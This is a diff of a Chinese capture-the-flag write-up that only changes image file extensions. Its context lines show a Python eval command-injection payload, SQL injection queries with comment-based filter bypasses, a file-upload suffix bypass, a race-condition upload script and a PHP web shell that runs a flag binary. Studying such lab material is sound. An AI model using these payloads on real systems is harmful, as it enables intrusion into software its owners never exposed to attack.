@@ -25,7 +25,7 @@ eval(input("What is the number?: "))
 __import__('os').system("dir")
 ```
 
-![image](./assets/001.jpg)
+![image](./assets/001.png)
 
 但是并不知道环境是否出网，而且也不知道远程是否可行
 
@@ -176,7 +176,7 @@ app.listen(port, () => {
 
 写了两个异步函数在这里，抓包发现也确实是这样的
 
-![image](./assets/003.jpg)
+![image](./assets/003.png)
 
 然后看到WEB应用代码，是个很明显的sql注入
 
@@ -275,7 +275,7 @@ select/**/group_concat(value)from/**/Flag_REDACTED
 
 但是题目不一样，并且因为是http2，
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 ![image](./assets/005.jpg)
 
@@ -291,9 +291,9 @@ select/**/group_concat(value)from/**/Flag_843423739
 
 现在是要查内部注释的flag了，问gpt(我不如AI)
 
-![image](./assets/006.jpg)
+![image](./assets/006.png)
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 ```sql
 SELECT/**/query/**/FROM/**/information_schema.processlist/**/WHERE/**/id=connection_id()
@@ -362,11 +362,11 @@ if (!is_dir($target_dir)) {
 ?>
 ```
 
-![image](./assets/008.jpg)
+![image](./assets/008.png)
 
 这里是根据最后的一个点来判断后缀的，并且要求文件为txt文件，直接一个后缀问题就绕过了上传了但是
 
-![image](./assets/009.jpg)
+![image](./assets/009.png)
 
 这样子会把权限降低为0，单看代码我没看出什么，所以来进到docker里面来慢慢考量
 
@@ -376,11 +376,11 @@ docker exec -it 8a420fb7554e /bin/bash
 
 虽然我可以直接拿到`get_flag`这个文件，但是其中并不含有flag，他仅仅是一个二进制文件
 
-![image](./assets/010.jpg)
+![image](./assets/010.png)
 
 还是要getshell，上传了一个文件上去，发现确实想代码一般
 
-![image](./assets/011.jpg)
+![image](./assets/011.png)
 
 没有足够的权限，仔细想了想，文件上传getshell应该是不太可能了，但是他这里有个危险函数，想办法看看这里能不能命令执行
 
@@ -486,7 +486,7 @@ Submit Art
 
 ```
 
-![image](./assets/013.jpg)
+![image](./assets/013.png)
 
 进antsword的虚拟终端就可以拿到flag了
 
@@ -534,7 +534,7 @@ threading.Thread(target=upload_shell).start()
 get_shell()
 ```
 
-![image](./assets/014.jpg)
+![image](./assets/014.png)
 
 ```
 <?php system('cd ../../;./get_flag'); ?>
